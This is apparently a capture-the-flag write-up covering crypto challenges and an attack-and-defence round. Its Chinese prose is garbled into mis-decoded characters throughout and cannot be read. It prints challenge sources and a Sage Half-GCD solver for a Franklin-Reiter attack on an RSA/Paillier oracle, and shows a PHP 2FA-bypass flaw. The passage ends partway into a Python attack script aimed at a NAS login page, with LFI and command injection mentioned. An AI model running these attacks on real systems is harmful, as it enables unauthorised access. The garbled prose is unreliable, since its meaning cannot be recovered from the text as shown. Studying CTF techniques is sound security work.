<h2 id="Day1-æ™šä¸Š-Day2-ä¸€é–‹å§‹çš„-Crypto-ä¹‹æ—…"><a href="#Day1-æ™šä¸Š-Day2-ä¸€é–‹å§‹çš„-Crypto-ä¹‹æ—…" class="headerlink" title="Day1 æ™šä¸Š ~ Day2 ä¸€é–‹å§‹çš„ Crypto ä¹‹æ—…"></a>Day1 æ™šä¸Š ~ Day2 ä¸€é–‹å§‹çš„ Crypto ä¹‹æ—…</h2><p>é€™æ¬¡ Jeopardy åˆ†æ•¸æ˜¯å¾ 1500 ~ 5000 åˆ†å‹•æ…‹èª¿åˆ†ï¼Œä»¥æ¯”è³½æœ€å¾Œçš„åˆ†æ•¸å‘ˆç¾ä¾†è¬›ä¸€é¡Œ Jeopardy ç”šè‡³æœƒæŠµæ‰ä¸€åˆ°å…©å€‹ A&amp;D or KoH çš„åˆ†æ•¸â€¦ï¼Œå¯ä»¥èªª Jeopardy å®šç”Ÿæ­»  </p>
<p>å…ˆä¸Šå€‹ Maple èªªçš„è©±ï¼š<br><img src="https://hackmd.io/_uploads/ByuVwsBY1e.png" alt="image">  </p>
<p><del>æˆ‘çœŸçš„ä¿¡äº†ï¼Œç”šè‡³ä¸€é–‹å§‹é‚„æˆ³åˆ°æ¯”è¼ƒé›£çš„é‚£é¡Œç•¶ç°¡å–®é¡Œ</del>  </p>
<h3 id="zkdlp"><a href="#zkdlp" class="headerlink" title="zkdlp"></a>zkdlp</h3><p><strong>chal.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> shake_128</span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x2CDE2997126F706BD27498A9FA07E93F321B4932982BC455910FF694160DB5484257D0886EC66E5D7BE59ECFD16AAFF6B5BD57E600FAB97E7CF75D76A7F12BC4619A036ED8787F4508CC7C1FB35689575E007B7DC6B1EECC4B9BC2E91AA31FBE027C62BFF3E2065912591ECC1C361CEEAE75B382F1BD7D967633FD91476A3ABC4AD22CD3372C3FC40C2841B3BC70DAC11E3A6631AB3BE49AB9F748AE9093FBAB15B5457244363F444D146C0ADE84CC1AB0D0CFB2AD329483E957235EDD0085BD2F5CDAFCD77D00622A9DFCD3C0098DCB42C7EF1DEE808E8216F0F0638F51D26614B0C61352A13565098FE60146FF7E46FAEBCB75629DAF517880E36AEEE617B9F</span></span><br><span class="line">q = (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(g, q, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line">    hflag = shake_128(flag.encode()).digest(q.bit_length() // <span class="number">8</span>)</span><br><span class="line">    x = bytes_to_long(hflag)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you know the flag?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    wins = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> wins &lt; <span class="number">10</span>:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;t = &quot;</span>)) % p</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Nope&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        c = random.randrange(q)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>)) % q</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(g, s, p) == t * <span class="built_in">pow</span>(y, c, p) % p:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hmm, you probably know the flag!&quot;</span>)</span><br><span class="line">            wins += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No, you don&#x27;t know the flag :(&quot;</span>)</span><br><span class="line">            wins = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Okay, I am finally convinced that you know the flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>æ•´å€‹zkpçš„é‚è¼¯å…¶å¯¦æ²’ä»€éº¼å•é¡Œï¼Œæœ‰å•é¡Œçš„æœƒæ˜¯ randomï¼Œå¦‚æœå¯é æ¸¬é‚£ä¸€é–‹å§‹ t å¡ä¸€å€‹ pow(y, c, p)çš„æ¨¡é€†å…ƒï¼Œæœ€å¾Œ s å¤§è†½è¼¸å…¥ 0 å°±å¥½<br>ç¿»ä¸€ä¸‹ randrange çš„å¯¦åšå°±çŸ¥é“ä»–rå°±æ˜¯ getrandbitsï¼Œç„¶å¾ŒæŠŠå¤ªå¤§çš„æ•¸ä¸Ÿæ‰å†ç”Ÿä¸€æ¬¡ï¼Œè€Œ getrandbits çœ¾æ‰€å‘¨çŸ¥çš„å¯é æ¸¬â€¦å—?<br>ä¸ï¼Œå› ç‚ºä»Šå¤© q çš„å¤§å°æ˜¯ 2049 bitsï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ä¸€èˆ¬ 32 bits ä¸€çµ„çš„æ€ç¶­å»æƒ³ï¼Œæœ‰å¾ˆå¤šæœªçŸ¥é …<br>ä¸€é–‹å§‹æˆ‘çš„æ€è·¯æ˜¯ç”³è«‹åçµ„(æ¥µé™ï¼Œå› ç‚ºè¦æœ‰ <code>32*624</code> bits çš„è³‡æ–™)ï¼Œç„¶å¾Œè³­ä»–è·Ÿ getrandbits ä¸€æ¨£ï¼Œå·®ä¸å¤š 30, 40 æ¬¡æœƒæœ‰ä¸€æ¬¡æ˜¯é€™æ¨£ï¼ŒåŠ ä¸ŠéšŠå‹ @Chisheng Chen èªªä»–ä»¥å‰ç”¨ z3+å¡æœªçŸ¥é …(32 bits ä¸€çµ„ä¸‹è¢«ä¸Ÿæ‰çš„å…§å®¹)å»æ‰“å°±èƒ½éï¼Œå°±æŠŠè¤‡é›œçš„æ‘³è…³æœ¬ä»»å‹™çµ¦ä»–äº†<br>ä½†æœ€å¾Œå¥½åƒå‡ºäº†é»å•é¡Œ(SAT Solver å–åˆ°ä¸€çµ„å°±æœƒåœ)ï¼Œåæ­£æˆ‘å€‘æœ€å¾Œæ˜¯ç›´æ¥ç”³è«‹ 30 çµ„ï¼Œç„¶å¾ŒæŠŠæ¯å€‹ä¸­é–“é–“æ ¼(è¢«ä¸Ÿæ‰)çš„ bits ç•¶æœªçŸ¥æ•¸ä¸€èµ·å¡çµ¦ z3 å»è™•ç†ï¼Œå·®ä¸å¤šæ¯äº”æ¬¡æœƒæœ‰ä¸€æ¬¡å°ï¼ŒæŒº feasible<br>å…ˆä¸ä¸Šè…³æœ¬â€¦éæ–¼æ··äº‚ ä½†â€¦éäº† :D  </p>
<h3 id="prsa"><a href="#prsa" class="headerlink" title="prsa"></a>prsa</h3><p><strong>prsa.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, getRandomRange, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">sz</span>):</span><br><span class="line">    p = getPrime(sz // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(sz // <span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    g = <span class="number">1</span> + n</span><br><span class="line">    mu = <span class="built_in">pow</span>(phi, -<span class="number">1</span>, n)</span><br><span class="line">    pk = (n, e, g)</span><br><span class="line">    sk = (n, d, phi, mu)</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">pk, m</span>):</span><br><span class="line">    n, e, g = pk</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">sk, c</span>):</span><br><span class="line">    n, d, phi, mu = sk</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_encrypt</span>(<span class="params">pk, m</span>):</span><br><span class="line">    n, e, g = pk</span><br><span class="line">    r = getRandomRange(<span class="number">1</span>, n)</span><br><span class="line">    n2 = n * n</span><br><span class="line">    <span class="comment"># pow(g, m, n2) == (m * n + 1) % (n * n)</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(g, m, n2) * <span class="built_in">pow</span>(r, n, n2)) % n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_decrypt</span>(<span class="params">sk, c</span>):</span><br><span class="line">    n, d, phi, mu = sk</span><br><span class="line">    cl = <span class="built_in">pow</span>(c, phi, n * n)</span><br><span class="line">    <span class="keyword">return</span> ((cl - <span class="number">1</span>) // n) * mu % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_to_paillier</span>(<span class="params">pk, sk, c</span>):</span><br><span class="line">    <span class="keyword">return</span> paillier_encrypt(pk, rsa_decrypt(sk, c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_to_rsa</span>(<span class="params">pk, sk, c</span>):</span><br><span class="line">    <span class="keyword">return</span> rsa_encrypt(pk, paillier_decrypt(sk, c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m, ln</span>):</span><br><span class="line">    pad_ln = ln - <span class="built_in">len</span>(m)</span><br><span class="line">    pre = pad_ln // <span class="number">2</span></span><br><span class="line">    post = pad_ln - pre</span><br><span class="line">    <span class="keyword">return</span> os.urandom(pre) + m + os.urandom(post)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pk, sk = keygen(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line">    m = bytes_to_long(pad(flag.encode(), <span class="number">1024</span> // <span class="number">8</span> - <span class="number">1</span>))</span><br><span class="line">    c = rsa_encrypt(pk, m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA Encrypted Flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48763</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1. RSA to Paillier&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;2. Paillier to RSA&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;3. Exit&quot;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;c = &quot;</span>))</span><br><span class="line">            c = rsa_to_paillier(pk, sk, c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;c = &quot;</span>))</span><br><span class="line">            c = paillier_to_rsa(pk, sk, c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid choice&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>ä¸€å€‹ Pailler åŒæ…‹åŠ å¯†å’Œ RSA äº’æ›çš„æœå‹™ï¼Œå…±ç”¨å…¬ã€ç§é‘°<br>å¹¾å€‹æ­¥é©Ÿï¼š  </p>
<ol>
<li>leak Nï¼šæ³¨æ„åˆ°æŠŠ <code>paillier_to_rsa</code> å’Œ <code>rsa_to_paillier</code> çš„éç¨‹çµåˆåœ¨ä¸€èµ·èƒ½é¸å®šä»»æ„å¤§æ–¼ N çš„å¯†æ–‡ï¼Œå†é‡æ–°è¢« RSA è§£å¯†ã€åŠ å¯†å¾Œçš„å€¼ï¼Œè€Œé€™å…©å€‹å€¼ mod N æœƒä¸€æ¨£ï¼Œä¹Ÿå°±æ˜¯ä»–å€‘ç›¸æ¸›å…¶å¯¦æ˜¯ N çš„å€æ•¸ã€‚  </li>
<li>ç²å¾— N ä¹‹å¾Œå°±èƒ½é–‹å§‹æƒ³ä¸‹ä¸€æ­¥ï¼Œæ³¨æ„åˆ° Pailler åŠ å¯†çš„ç‰¹æ€§ï¼š<br>å…©å€‹å¯†æ–‡ç›¸ä¹˜é€²å»è§£å¯†ï¼Œæœ€å¾Œå–å¾—çš„æ˜æ–‡æ˜¯å…©è€…æœ¬ä¾†çš„æ˜æ–‡ç›¸åŠ ï¼Œæ¨æ¨ç®—å¼å°±çŸ¥é“ï¼Œç°¡å–®èªªæ˜¯å› ç‚º Pailler å°å¾…å¯†æ–‡çš„æ–¹æ³•æ˜¯æ‹¿å»ç•¶æŒ‡æ•¸ï¼Œ$c^m \times c^n&#x3D;c^{n+m}$<br>åˆ©ç”¨é€™å€‹ç‰¹æ€§çµåˆå…©å€‹æœå‹™ï¼Œå°±èƒ½ leak flag + ä»»æ„æ•¸å­— RSA åŠ å¯†å¾Œçš„çµæœäº†  </li>
<li>Franklin-Reiter Attackï¼šä»»æ„ç›¸åŠ ç•¶ç„¶å°±æ˜¯å®ƒï¼Œå”¯ä¸€çš„é»æ˜¯ e å¤ªå¤§ï¼Œä¿éšªèµ·è¦‹è¦å¤šå–å¹¾çµ„è½‰æˆå¤šé …å¼å¾Œåš Half GCD</li>
</ol>
<p>å‰é¢éæ–¼æ··äº‚ï¼Œæ”¾ä¸»ç®—æ³•ï¼š<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whx1003/p/16217087.html">Half GCD è¬›è§£</a><br>å¯¦ä½œåƒè€ƒï¼š<a target="_blank" rel="noopener" href="https://github.com/rkm0959/Implementations/blob/main/Half_GCD/code.sage">https://github.com/rkm0959/Implementations/blob/main/Half_GCD&#x2F;code.sage</a>  </p>
<p>åˆå§‹ statements å°±æ˜¯ flag-0 ~ flag-9  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">HGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * b.degree() &lt;= a.degree() <span class="keyword">or</span> a.degree() == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    m = a.degree() // <span class="number">2</span></span><br><span class="line">    a_top, a_bot = a.quo_rem(x**m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x**m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x**(m // <span class="number">2</span>))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x**(m // <span class="number">2</span>))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    <span class="keyword">return</span> RET00, RET01, RET10, RET11</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> GCD(d, r)</span><br><span class="line"></span><br><span class="line">P = PolynomialRing(Zmod(n), names=(<span class="string">&#x27;x&#x27;</span>,)); (x,) = P._first_ngens(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">statements = [(x + i)**e - j <span class="keyword">for</span> i, j <span class="keyword">in</span> statements]</span><br><span class="line"></span><br><span class="line">k = statements[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, st <span class="keyword">in</span> <span class="built_in">enumerate</span>(statements[<span class="number">1</span>:]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    k = GCD(st, k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line">k = k.monic()</span><br><span class="line">flag = -k[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in </span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment"># print(statements[0])</span></span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬ä¸Šå°±æ˜¯é€™æ¨£ï¼Œç„¶å¾Œæˆ‘ä¸€è·¯åˆ°ä¸‰é»æ‰ç¡è¦ºâ€¦(<del>ä½† å·²ç¶“æ˜¯æœ€æ—©ç¡çš„äº†</del>)  </p>
<p>åŠå¤œä½œæ¥­å±€.jpg  </p>
<p><img src="https://hackmd.io/_uploads/rJCLqhHKyg.png" alt="image">  </p>
<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>é€™æ¬¡çš„ A&amp;D æœ‰å…©é¡Œï¼Œä¸€å€‹ç­†é›»é›»å•†å’Œä¸€å€‹ NAS<br>é›»å•†ï¼š<a target="_blank" rel="noopener" href="https://github.com/users/Bogay/packages/container/package/aiscop3">https://github.com/users/Bogay/packages/container/package/aiscop3</a><br><img src="https://hackmd.io/_uploads/BySuHhHYJg.png" alt="image"></p>
<p>é›»å•†ä¸€é–‹å§‹å¹¾ä¹æ˜¯é»‘ç®±ï¼Œä½† Dockerfile è¼‰ä¸€ä¸‹å°±æœ‰ âœ…  </p>
<p><del>æ˜¯ä¸æ˜¯åœ¨å·è‡­å•Šï¼Œè£¡é¢ç”šè‡³æœ‰å€‹å«åš excel-pay çš„åŸ·è¡Œæª”</del><br>åæ­£ç¬¬äºŒå¤©å°±å…ˆè— Jeopardy çš„ flagï¼Œè®“è‡ªå·±çš„æ’åæ‘”å‡ºå‰ä¸‰æ‰èƒ½çœ‹å°åŒ…ï¼Œä¸€é–‹å§‹å¯èƒ½æ˜¯ç¶²è·¯ issue ç”šè‡³é€£ NAS çš„ ip éƒ½æ²’æƒå‡ºä¾†â€¦<br>æ¯”è¼ƒæœ‰è¶£çš„æ˜¯é€™æ¬¡çš„ Patchï¼Œé›»å•†åªèƒ½ Patch LUA å¯«æˆçš„ WAFï¼Œæˆ‘çœ‹å¤§å®¶éƒ½æ²’ Patchï¼Œç„¶å¾Œ NAS å¯èƒ½æ˜¯æ´å¤ªå¤šæ‰€ä»¥å…©æ‹› LFI + CMDI å°±èƒ½æ‰“å¤©ä¸‹â€¦å¤§å®¶ä¹Ÿéƒ½ä¸ Patch æƒ¹<br>å¿«é€Ÿå¸¶ä¸€ä¸‹ NAS ç™»å…¥ç¹é 2FA çš„éƒ¨åˆ†ï¼š<br><strong>app.php</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="variable">$_SESSION</span>[<span class="string">&#x27;TWOFA&#x27;</span>] &lt;=&gt; <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// negative =&gt; TWOFA not passed</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: 2fa.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ç„¡æ•ˆ 2FAï¼Œä¸‰ä¸€å¾‹ä¸€å®šéƒ½èƒ½é â€¦<br>é©—è­‰ç¹éå¾Œå°±æ˜¯é–‹å¿ƒè®€æª”ï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">host</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>:5000/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    boundary = <span 